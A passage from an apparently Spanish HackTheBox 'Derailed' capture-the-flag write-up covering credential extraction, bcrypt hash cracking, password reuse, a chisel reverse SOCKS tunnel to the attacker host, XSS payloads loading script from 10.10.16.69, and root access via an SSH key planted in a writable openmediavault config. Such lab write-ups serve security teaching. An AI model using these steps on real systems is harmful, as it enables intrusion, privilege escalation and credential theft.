Date:   Fri May 27 21:06:07 2022 +0200

    init

commit 15df0becc4d8fc989bda8c154637d183258d3af0
Author: gituser <gituser@local>
Date:   Thu May 19 21:41:04 2022 +0200

    init
```

En uno de ellos, se exponen hashes y usuarios

```null
rails@derailed:/var/www/rails-app$ git checkout
rails@derailed:/var/www/rails-app$ ls
app              bin     config.ru  Gemfile       lib  node_modules  postcss.config.js  Rakefile   report_29_07_2023.log  startbootstrap-freelancer-gh-pages      storage  tmp     yarn.lock
babel.config.js  config  db         Gemfile.lock  log  package.json  public             README.md  screenshot.png         startbootstrap-freelancer-gh-pages.zip  test     vendor
rails@derailed:/var/www/rails-app$ cd db/
rails@derailed:/var/www/rails-app/db$ ls
development.sqlite3  migrate  schema.rb  seeds.rb
rails@derailed:/var/www/rails-app/db$ cat seeds.rb 
User.create(username: "alice", password: "recliner-bellyaching-bungling-continuum-gonging-laryngitis", role: "administrator")

Note.create(content: "example content", author: "alice")
```

De la base de datos puedo extraer dos hashes

```null
rails@derailed:/var/www/rails-app/db$ sqlite3 development.sqlite3 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
ar_internal_metadata  reports               users               
notes                 schema_migrations   
sqlite> .headers on
sqlite>  select * from users;
id|username|password_digest|role|created_at|updated_at
1|alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.|administrator|2022-05-30 18:02:45.319074|2022-05-30 18:02:45.319074
2|toby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle|user|2022-05-30 18:02:45.542476|2022-05-30 18:02:45.542476
105|rubbx|$2a$12$cPDqnxX8TGUQVpA9ItWEYeqiy8w8yyf4HRTtUQ6quBWruWDpgURxy|user|2023-07-29 15:18:29.211329|2023-07-29 15:18:29.211329
106|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|$2a$12$3YEU/vVwPpoToZtsJNeI7Oy1mQR5A..QtjUDet46K6KHcaI6yDMZW|user|2023-07-29 15:43:45.239049|2023-07-29 15:43:45.239049
107|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9|$2a$12$GN.ittHfkcW4MZO8tPTpweTkiiqYUm/OppAYYQn0DN20KoYH9jO/O|user|2023-07-29 15:45:58.774350|2023-07-29 15:45:58.774350
108|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script src="http://10.10.16.69/pwned.js"></script>|$2a$12$Lee/Nvr8IJWiN8ML/pnPOezIvoVr18n9a90Z6mG7RIWi9e2ACookG|user|2023-07-29 15:51:12.274104|2023-07-29 15:51:12.274104
109|test|$2a$12$3gTyRp/cKe0BTYILsp4.Du7WlI.XS1pouxjmYtwV6jquPNppPnAm.|user|2023-07-29 15:52:03.978019|2023-07-29 15:52:03.978019
110|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script src="http://10.10.16.69/pwned.js" onerror=alert('1');></script>|$2a$12$MK3fI4bgvnYw85VtCWDSfeQtxIhP2qnIDGiyq2wEZmnJiTiUeprIi|user|2023-07-29 15:53:52.400546|2023-07-29 15:53:52.400546
111|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <img src=x onerror=alert('1');>|$2a$12$T8xTXDGi4JI60ju6/AbxaeG73RXbrFiUiBZmEbQUeQPPWlePmSYzi|user|2023-07-29 16:04:01.330408|2023-07-29 16:04:01.330408
112|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <img src=x onerror=import('http://10.10.16.69/pwned.js');>|$2a$12$Ms9QPyFGMIR14E4MdI3ESOziGO76WRRZf.y.d8Xbi23OL8D4A0Ege|user|2023-07-29 16:07:47.998299|2023-07-29 16:07:47.998299
```

Los crackeo con ```hashcat```

```null
PS C:\Users\Usuario\Downloads\hashcat-6.2.6> .\hashcat.exe .\hashes.txt .\rockyou.txt --user -m 3200 --show
toby:$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle:greenday
```

La contraseña ```greenday``` se reutiliza para el usuario ```openmediavault-webgui```

```null
rails@derailed:/var/www/rails-app$ su 'openmediavault-webgui'
Password: 
openmediavault-webgui@derailed:/var/www/rails-app$ 
```

El puerto 80 está abierto internamente. Utilizo chisel para crear un tunel SOCKS5 y poder tener conectividad desde mi equipo

```null
openmediavault-webgui@derailed:/tmp$ ss -nltp | grep 80
LISTEN 0      511        127.0.0.1:80         0.0.0.0:*
```

En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

En la máquina víctima como cliente

```null
openmediavault-webgui@derailed:/tmp$ ./chisel client 10.10.16.69:1234 R:socks &>/dev/null & disown
```

Utilizando addons como ```Foxy Proxy``` puedo llegar a ver la web qeu incluye un panel de inicio de sesión

<img src="/writeups/assets/img/Derailed-htb/15.png" alt="">

No tengo credenciales válidas. En este [artículo](https://docs.openmediavault.org/en/5.x/faq.html#:~:text=I%C2%B4ve%20lost%20the,reset%20the%20web%20interface%20password.) explican como es posible cambiar la contraseña de ```openmediavault```. Tengo privilegios para ejecutar el binario que realiza esta acción

```null
openmediavault-webgui@derailed:/tmp$ ls -l /sbin/omv-firstaid
-rwxr-xr-x 1 root root 2774 Jan 20  2022 /sbin/omv-firstaid
```

<img src="/writeups/assets/img/Derailed-htb/16.png" alt="">

Gano acceso a una nueva interfaz

<img src="/writeups/assets/img/Derailed-htb/17.png" alt="">

Existe un RCE según este [artículo](https://www.obrela.com/openmediavault-remote-code-execution-rce-vulnerability/). A través del RCE puedo ver la versión

```null
openmediavault-webgui@derailed:/tmp$ /sbin/omv-rpc 
ERROR: Invalid number of arguments
Usage:
  omv-rpc [options] <service> <method> [params]

OPTIONS:
  -u --user  The name of the user
  -h --help  Print a help text
```

Me dirijo al repositorio de [Github](https://github.com/openmediavault/openmediavault)  para obtener el listado de funciones

<img src="/writeups/assets/img/Derailed-htb/18.png" alt="">

Con ```omv-rpc``` obtengo gran cantidad de información en JSON

```null
openmediavault-webgui@derailed:/tmp$ /sbin/omv-rpc -u admin system getInformation | jq
{
  "ts": 1690704891,
  "time": "Sun 30 Jul 2023 04:14:51 AM EDT",
  "hostname": "derailed",
  "version": "6.0.27-1 (Shaitan)",
  "cpuModelName": "AMD EPYC 7302P 16-Core Processor",
  "cpuUsage": 0,
  "memTotal": "2077802496",
  "memFree": "685641728",
  "memUsed": "490745856",
  "memAvailable": "1370660864",
  "memUtilization": "0.34033",
  "kernel": "Linux 5.19.0-0.deb11.2-amd64",
  "uptime": 3504.07,
  "loadAverage": {
    "1min": 0.02,
    "5min": 0.05,
    "15min": 0.03
  },
  "configDirty": true,
  "rebootRequired": false,
  "pkgUpdatesAvailable": false
}
```

Como el servicio está corriendo como ```root``` si consigo inyectar comandos será como éste

```null
openmediavault-webgui@derailed:/tmp$ ps -faux | grep omv | grep -v grep
root         842  0.0  0.8  70948 17092 ?        S    03:16   0:00 omv-engined
```

Puedo modificar el archivo de configuración

```null
openmediavault-webgui@derailed:/etc$ find -writable 2>/dev/null
./systemd/system/ntp.service
./systemd/system/netfilter-persistent.service
./systemd/system/samba-ad-dc.service
./systemd/system/systemd-timesyncd.service
./openmediavault/config.xml
```

Dentro se encuentran definidos los usuarios. Intento cambiar el usuario por ```root``` e inserto una clave pública en un formato compatible para [omv](https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/)

```null
ssh-keygen -t rsa
```

```null
ssh-keygen -e -f ~/.ssh/id_rsa.pub
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "3072-bit RSA, converted by root@kali from OpenSSH"
AAAAB3NzaC1yc2EAAAADAQABAAABgQDPortoH4L+3RkP86Pd933YP753CfCWbUKKco7GMA
KJB6oDgCFPitmVE4BKYbsAK8BTiBJhzakemOPTfjSTUYdebcAOMSeVu1C1DE9jvXUzeWPE
hQZoW7APRbLGocoiPrWpkd1Hi/3e2TGPGz7ptxppE4dOOOXfNUuUacLScDnK00ldcKcAGn
DAGFxyjDC/d/5uMt2kYmmvj5NLhdPwrl+nv5wnWhRCySp73CXvwmYhoUfZLRuH+Khd8hyn
3Z7vmIPvRj056PXsfKP7ijH4n6V1Si9DU7/lLQUykK2uucFfFdCSO8sO+fiTludQrbCNoD
MGBtJUpQ+Xfg9JMBZ6c2fpD04xfmwigz+rB4s6GDXWivzlCiUKvTR0zEHT1VeV0bQXuE8Y
woCTHyBNLMMba/CmjDANVv5txhkE+ZP/cSMtW8q/+V6kH35C8KFaTLz7Fbzot7isNCZhkA
Ayct2ZMQyUo5eW+idrKnwl8OlzNhbTSXyL0nNsy4DovFVulF9M8gc=
---- END SSH2 PUBLIC KEY ----
```

A través de la función ```applyChanges``` puedo reiniciar los módulos

```null
<user>
          <uuid>e3f59fea-4be7-4695-b0d5-560f25072d4a</uuid>
          <name>root</name>
          <email></email>
          <disallowusermod>0</disallowusermod>
          <sshpubkeys>---- BEGIN SSH2 PUBLIC KEY ----Comment: "3072-bit RSA, converted by root@kali from OpenSSH"AAAAB3NzaC1yc2EAAAADAQABAAABgQDSwoEYmJcVBSX4scq7WpVo9qFbvijwqmSV92BGEwtgphNMS4s/l36x5KOSF0Ll4La>
        </user>
```


<img src="/writeups/assets/img/Derailed-htb/19.png" alt="">

Recargo el módulo y me conecto como ```root```

```null
openmediavault-webgui@derailed:/etc$ /usr/sbin/omv-rpc -u admin config applyChanges '{"force": true, "modules":["ssh"] }'
null
```

Puedo ver la segunda flag

```null
ssh root@10.10.11.190
Linux derailed 5.19.0-0.deb11.2-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.19.11-1~bpo11+1 (2022-10-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@derailed:~# cat /root/root.txt 
16cde0fbd090b9df7b59b4f2388da926
```